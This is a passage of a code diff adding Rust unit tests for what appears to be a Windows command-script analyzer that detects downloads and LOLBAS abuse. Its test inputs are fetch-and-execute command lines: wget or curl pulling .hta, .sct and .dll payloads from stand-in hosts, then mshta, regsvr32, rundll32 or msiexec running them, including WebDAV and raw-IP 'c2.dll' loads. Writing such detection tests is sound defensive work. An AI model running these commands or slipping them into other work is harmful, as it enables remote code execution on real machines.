+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://wget-glued-prefix-mshta.example/payload.hta"
+                        && dst == r#"C:\Temp"#
+            )
+        });
+        assert!(
+            has_download_prefix,
+            "wget glued -P did not record destination prefix: {:?}",
+            report.traits
+        );
+        let has_resolved_mshta = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://wget-glued-prefix-mshta.example/payload.hta"
+            )
+        });
+        assert!(
+            has_resolved_mshta,
+            "mshta local HTA did not resolve glued wget -P download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn wget_short_option_cluster_directory_prefix_tracks_url_basename_for_later_execution() {
+        let report = crate::analyze(
+            br#"wget -qPC:\Temp https://wget-cluster-prefix-mshta.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has_download_prefix = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://wget-cluster-prefix-mshta.example/payload.hta"
+                        && dst == r#"C:\Temp"#
+            )
+        });
+        assert!(
+            has_download_prefix,
+            "wget clustered -P did not record destination prefix: {:?}",
+            report.traits
+        );
+        let has_resolved_mshta = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://wget-cluster-prefix-mshta.example/payload.hta"
+            )
+        });
+        assert!(
+            has_resolved_mshta,
+            "mshta local HTA did not resolve clustered wget -P download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn wget_schemeless_domain_path_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget wget-schemeless.example/payload.bin -O C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "http://wget-schemeless.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+        assert!(env
+            .modified_filesystem
+            .contains_key(r#"c:\temp\payload.bin"#));
+    }
+
+    #[test]
+    fn wget_uppercase_long_header_url_does_not_become_download_src() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget --HEADER http://wget-header-only.example/ref --OUTPUT-DOCUMENT=NUL"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            Vec::<(&str, Option<&str>)>::new(),
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_attached_long_output_option_is_case_insensitive() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget --OUTPUT-DOCUMENT=C:\Temp\upper.bin https://wget-upper-output.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-upper-output.example/payload.bin",
+                Some(r#"C:\Temp\upper.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn get_exe_wget_style_glued_output_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"get.exe https://get-direct.example/payload.bin -OC:\Temp\get.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://get-direct.example/payload.bin",
+                Some(r#"C:\Temp\get.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_short_option_cluster_records_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"wget -qO C:\Temp\payload.bin https://wget-cluster.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://wget-cluster.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+        assert!(env
+            .modified_filesystem
+            .contains_key(r#"c:\temp\payload.bin"#));
+    }
+}
+
+#[cfg(test)]
+mod msiexec_tests {
+    use crate::analyze;
+    use crate::env::{Config, Environment};
+    use crate::interp::interpret_line;
+    use crate::traits::Trait;
+
+    #[test]
+    fn msiexec_url_package_argument_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"msiexec /quiet /i "https://msiexec-direct.example/setup.msi""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://msiexec-direct.example/setup.msi"
+            )
+        });
+        assert!(has, "msiexec URL argument not typed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn msiexec_attached_install_url_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"msiexec /quiet /ihttps://msiexec-attached.example/setup.msi"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://msiexec-attached.example/setup.msi"
+            )
+        });
+        assert!(
+            has,
+            "msiexec attached URL argument not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_patch_url_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"msiexec /quiet /p "https://msiexec-patch.example/update.msp""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://msiexec-patch.example/update.msp"
+            )
+        });
+        assert!(
+            has,
+            "msiexec patch URL argument not typed: {:?}",
+            env.traits
+        );
+        let has_lolbas = env.traits.iter().any(
+            |t| matches!(t, Trait::Lolbas { name, cmd } if name == "msiexec" && cmd.contains("/p")),
+        );
+        assert!(
+            has_lolbas,
+            "msiexec patch URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_schemeless_package_url_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"msiexec /quiet /i msiexec-schemeless.example/setup.msi"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "http://msiexec-schemeless.example/setup.msi"
+            )
+        });
+        assert!(
+            has,
+            "msiexec schemeless package URL argument not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_local_package_argument_emits_lolbas_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"msiexec /i "C:\Users\Public\ScreenConnect.ClientSetup.msi" /qn /norestart"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Lolbas { name, cmd }
+                    if name == "msiexec" && cmd.contains("ScreenConnect.ClientSetup.msi")
+            )
+        });
+        assert!(
+            has,
+            "msiexec local package did not emit LOLBAS trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_local_package_resolves_prior_download_source() {
+        let report = analyze(
+            br#"curl -o ScreenConnect.ClientSetup.msi "https://msiexec-local.example/ScreenConnect.ClientSetup.msi"
+msiexec /i ScreenConnect.ClientSetup.msi /qn"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "msiexec /i ScreenConnect.ClientSetup.msi /qn"
+                        && url == "https://msiexec-local.example/ScreenConnect.ClientSetup.msi"
+            )
+        });
+        assert!(
+            has,
+            "msiexec local package did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_basename_package_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\setup.msi https://msiexec-basename.example/setup.msi"#,
+            &mut env,
+        );
+        interpret_line("msiexec /i setup.msi /qn", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "msiexec /i setup.msi /qn"
+                        && url == "https://msiexec-basename.example/setup.msi"
+            )
+        });
+        assert!(
+            has,
+            "msiexec basename package did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+}
+
+#[cfg(test)]
+mod certreq_tests {
+    use crate::env::{Config, Environment};
+    use crate::interp::interpret_line;
+    use crate::traits::Trait;
+
+    #[test]
+    fn certreq_config_url_emits_typed_trait() {
+        let raw = r#"certreq -Post -config "https://certreq-direct.example/submit" request.req response.txt"#;
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+        let has_url = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://certreq-direct.example/submit"
+            )
+        });
+        let has_lolbas = env
+            .traits
+            .iter()
+            .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "certreq" && cmd == raw));
+        assert!(has_url, "certreq config URL not typed: {:?}", env.traits);
+        assert!(
+            has_lolbas,
+            "certreq config URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certreq_attached_config_url_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"certreq -Post /config:https://certreq-attached.example/submit request.req response.txt"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://certreq-attached.example/submit"
+            )
+        });
+        assert!(
+            has,
+            "certreq attached config URL not typed: {:?}",
+            env.traits
+        );
+    }
+}
+
+#[cfg(test)]
+mod certoc_tests {
+    use crate::env::{Config, Environment};
+    use crate::interp::interpret_line;
+    use crate::traits::Trait;
+
+    #[test]
+    fn certoc_getcacaps_url_emits_download() {
+        let raw = r#"certoc.exe -GetCACAPS "https://certoc-direct.example/stage.ps1""#;
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+        let has_download = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: None, .. }
+                    if src == "https://certoc-direct.example/stage.ps1"
+            )
+        });
+        let has_lolbas = env
+            .traits
+            .iter()
+            .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "certoc" && cmd == raw));
+        assert!(
+            has_download,
+            "certoc GetCACAPS URL not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            has_lolbas,
+            "certoc GetCACAPS URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certoc_attached_getcacaps_url_emits_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"certoc /GetCACAPS:https://certoc-attached.example/stage.ps1"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: None, .. }
+                    if src == "https://certoc-attached.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "certoc attached GetCACAPS URL not typed: {:?}",
+            env.traits
+        );
+    }
+}
+
+#[cfg(test)]
+mod desktopimgdownldr_tests {
+    use crate::env::{Config, Environment};
+    use crate::interp::interpret_line;
+    use crate::traits::Trait;
+
+    #[test]
+    fn desktopimgdownldr_lockscreenurl_emits_download() {
+        let raw = r#"desktopimgdownldr.exe /lockscreenurl:https://desktopimg.example/a.jpg /eventName:test"#;
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+        let has_download = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: None, .. }
+                    if src == "https://desktopimg.example/a.jpg"
+            )
+        });
+        let has_lolbas = env.traits.iter().any(|t| {
+            matches!(t, Trait::Lolbas { name, cmd } if name == "desktopimgdownldr" && cmd == raw)
+        });
+        assert!(
+            has_download,
+            "desktopimgdownldr lockscreen URL not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            has_lolbas,
+            "desktopimgdownldr lockscreen URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn desktopimgdownldr_spaced_lockscreenurl_emits_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"desktopimgdownldr /lockscreenurl "https://desktopimg-spaced.example/a.jpg" /eventName test"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: None, .. }
+                    if src == "https://desktopimg-spaced.example/a.jpg"
+            )
+        });
+        assert!(
+            has,
+            "desktopimgdownldr spaced lockscreen URL not typed: {:?}",
+            env.traits
+        );
+    }
+}
+
+#[cfg(test)]
+mod regsvr32_tests {
+    use crate::env::{Config, Environment};
+    use crate::interp::interpret_line;
+    use crate::traits::Trait;
+
+    #[test]
+    fn regsvr32_scriptlet_url_argument_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "regsvr32 /s /n /u /i:http://regsvr32-direct.example/payload.sct scrobj.dll",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "http://regsvr32-direct.example/payload.sct"
+            )
+        });
+        assert!(has, "regsvr32 scriptlet URL not typed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn regsvr32_schemeless_scriptlet_url_argument_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "regsvr32 /s /n /u /i:regsvr32-schemeless.example/payload.sct scrobj.dll",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url, .. }
+                    if url == "http://regsvr32-schemeless.example/payload.sct"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 schemeless scriptlet URL not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_unc_webdav_target_emits_lolbas_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"regsvr32 /s \\travel-sagem-distant-potential.trycloudflare.com@SSL\DavWWWRoot\loader.sct"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Lolbas { name, cmd }
+                    if name == "regsvr32"
+                        && cmd.contains(r#"\\travel-sagem-distant-potential.trycloudflare.com@SSL\DavWWWRoot\loader.sct"#)
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 UNC/WebDAV target not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_plain_unc_load_target_emits_lolbas_trait_without_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"regsvr32 /s \\104.156.149.6\webdav\c2.dll"#, &mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Lolbas { name, cmd }
+                    if name == "regsvr32"
+                        && cmd.contains(r#"\\104.156.149.6\webdav\c2.dll"#)
+            )),
+            "plain UNC regsvr32 load target did not emit LOLBAS trait: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UrlArgument { .. })),
+            "plain UNC regsvr32 target should not synthesize URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_local_target_emits_lolbas_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line("regsvr32 /s younewrules.get", &mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Lolbas { name, cmd }
+                    if name == "regsvr32" && cmd == "regsvr32 /s younewrules.get"
+            )),
+            "local regsvr32 target did not emit LOLBAS trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_unc_webdav_target_emits_url_argument() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"regsvr32 /s \\travel-sagem-distant-potential.trycloudflare.com@SSL\DavWWWRoot\loader.sct"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://travel-sagem-distant-potential.trycloudflare.com/loader.sct"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 UNC/WebDAV target URL not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_local_scriptlet_resolves_prior_download_source() {
+        let report = crate::analyze(
+            br#"curl -o payload.sct https://regsvr32-local.example/payload.sct
+regsvr32 /s /n /u /i:payload.sct scrobj.dll"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "regsvr32 /s /n /u /i:payload.sct scrobj.dll"
+                        && url == "https://regsvr32-local.example/payload.sct"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 local scriptlet did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_local_load_target_resolves_prior_download_source() {
+        let report = crate::analyze(
+            br#"curl -o stage.dll https://regsvr32-load.example/stage.dll
+regsvr32 /s stage.dll"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "regsvr32 /s stage.dll"
+                        && url == "https://regsvr32-load.example/stage.dll"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 local load target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_basename_load_target_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\stage.dll https://regsvr32-basename.example/stage.dll"#,
+            &mut env,
+        );
+        interpret_line("regsvr32 /s stage.dll", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "regsvr32 /s stage.dll"
+                        && url == "https://regsvr32-basename.example/stage.dll"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 basename load target did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
 mod misc_handler_tests {
-    use crate::env::{Config, Environment};
+    use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
 
@@ -6190,6 +10661,194 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn mshta_inline_vbscript_shell_run_url_is_scanned() {
+        let raw = r#"mshta vbscript:CreateObject("Wscript.Shell").Run("mshta http://mshta-inline-vbs.example/payload.hta")"#;
+        let script = raw.as_bytes();
+        let report = crate::analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://mshta-inline-vbs.example/payload.hta"
+                )
+            }),
+            "inline mshta VBScript URL was not scanned: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "mshta" && cmd == raw)),
+            "inline mshta VBScript payload not marked as LOLBAS: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn mshta_liberal_url_emits_normalized_download() {
+        let raw = r#"mshta "hTtP:\\mshta-liberal.example\payload.hta""#;
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://mshta-liberal.example/payload.hta"
+            )
+        });
+        assert!(has, "mshta URL not normalized: {:?}", env.traits);
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "mshta" && cmd == raw)),
+            "mshta remote URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn mshta_schemeless_domain_path_emits_normalized_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"mshta mshta-schemeless.example/payload.hta"#, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://mshta-schemeless.example/payload.hta" && dst.is_none()
+            )
+        });
+        assert!(has, "schemeless mshta URL not normalized: {:?}", env.traits);
+    }
+
+    #[test]
+    fn mshta_local_hta_resolves_prior_download_source() {
+        let report = crate::analyze(
+            br#"curl -o payload.hta https://mshta-local.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://mshta-local.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "mshta local HTA did not resolve prior download source: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "mshta" && cmd == "mshta payload.hta")),
+            "mshta prior-downloaded HTA not marked as LOLBAS: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn mshta_basename_hta_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\payload.hta https://mshta-basename.example/payload.hta"#,
+            &mut env,
+        );
+        interpret_line("mshta payload.hta", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://mshta-basename.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "mshta basename HTA did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn mshta_local_hta_content_queues_script_block() {
+        let mut env = Environment::new(&Config::default());
+        let hta = br#"<html><script language="JScript">
+new ActiveXObject("WScript.Shell").Run("mshta mshta-local-content.example/payload.hta");
+</script></html>"#
+            .to_vec();
+        env.modified_filesystem.insert(
+            "payload.hta".to_string(),
+            FsEntry::Content {
+                content: hta,
+                append: false,
+            },
+        );
+        interpret_line("mshta payload.hta", &mut env);
+        assert!(
+            env.all_extracted_jscript.iter().any(|payload| {
+                payload
+                    .windows(b"mshta-local-content.example".len())
+                    .any(|window| window == b"mshta-local-content.example")
+            }),
+            "local HTA script block was not queued for scanning: {:?}",
+            env.all_extracted_jscript
+        );
+    }
+
+    #[test]
+    fn html_help_url_argument_emits_url_launch() {
+        let raw = r#"hh.exe "https://hh-direct.example/help.chm""#;
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlLaunch { cmd, url }
+                        if cmd == raw && url == "https://hh-direct.example/help.chm"
+                )
+            }),
+            "HTML Help URL launch not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "hh" && cmd == raw)),
+            "HTML Help URL launch not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn browser_url_launchers_emit_url_launch() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "explorer.exe https://explorer-direct.example/privacy/",
+            &mut env,
+        );
+        interpret_line("msedge browser-direct.example/lure.pdf", &mut env);
+        for expected in [
+            "https://explorer-direct.example/privacy/",
+            "http://browser-direct.example/lure.pdf",
+        ] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlLaunch { url, .. } if url == expected)),
+                "missing browser UrlLaunch for {expected}: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
     fn rundll32_records_cmd() {
         let mut env = Environment::new(&Config::default());
         interpret_line("rundll32 some.dll,EntryPoint", &mut env);
@@ -6197,6 +10856,232 @@ mod misc_handler_tests {
             .traits
             .iter()
             .any(|t| matches!(t, Trait::Rundll32 { .. })));
+    }
+
+    #[test]
+    fn rundll32_fileprotocolhandler_url_emits_url_launch() {
+        let raw = "rundll32 url.dll,FileProtocolHandler https://rundll32-direct.example/lure.pdf";
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlLaunch { url, .. }
+                    if url == "https://rundll32-direct.example/lure.pdf"
+            )
+        });
+        assert!(
+            has,
+            "rundll32 FileProtocolHandler URL launch not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "rundll32" && cmd == raw)
+            ),
+            "rundll32 FileProtocolHandler URL launch not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_fileprotocolhandler_schemeless_url_emits_url_launch() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "rundll32 url.dll,FileProtocolHandler rundll32-schemeless.example/lure.pdf",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlLaunch { url, .. }
+                    if url == "http://rundll32-schemeless.example/lure.pdf"
+            )
+        });
+        assert!(
+            has,
+            "rundll32 FileProtocolHandler schemeless URL launch not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_image_viewer_url_argument_emits_url_launch() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"rundll32.exe shimgvw.dll,ImageView_Fullscreen "https://rundll32-image.example/pic.jpg""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlLaunch { url, .. }
+                    if url == "https://rundll32-image.example/pic.jpg"
+            )
+        });
+        assert!(
+            has,
+            "rundll32 image viewer URL launch not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_scrobj_generatetypelib_url_argument_emits_download() {
+        let raw = r#"rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj.example/payload.exe"#;
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: None, .. }
+                    if src == "https://rundll32-scrobj.example/payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "rundll32 scrobj GenerateTypeLib URL download not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "rundll32" && cmd == raw)
+            ),
+            "rundll32 scrobj GenerateTypeLib URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_scrobj_local_target_resolves_prior_download_source() {
+        let report = crate::analyze(
+            br#"curl -o payload.sct https://rundll32-scrobj-local.example/payload.sct
+rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"
+                        && url == "https://rundll32-scrobj-local.example/payload.sct"
+            )
+        });
+        assert!(
+            has,
+            "rundll32 scrobj local target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_mshtml_inline_javascript_url_is_scanned() {
+        let script = br#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";fetch("https://rundll32-mshtml-js.example/stage")"#;
+        let report = crate::analyze(script, &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://rundll32-mshtml-js.example/stage"
+                )
+            }),
+            "rundll32 mshtml inline JavaScript URL was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_quoted_downloaded_dll_with_spaces_resolves_url() {
+        let raw = r#"rundll32 "C:\Users\Public\stage one.dll",EntryPoint"#;
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            r#"c:\users\public\stage one.dll"#.to_string(),
+            FsEntry::Download {
+                src: "https://rundll32-space.example/stage.dll".to_string(),
+            },
+        );
+        interpret_line(raw, &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { url: Some(url), .. }
+                        if url == "https://rundll32-space.example/stage.dll"
+                )
+            }),
+            "rundll32 did not resolve downloaded DLL path: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "rundll32" && cmd == raw)
+            ),
+            "rundll32 downloaded DLL path not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_basename_dll_resolves_full_path_download_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\stage.dll https://rundll32-basename.example/stage.dll"#,
+            &mut env,
+        );
+        interpret_line("rundll32 stage.dll,EntryPoint", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
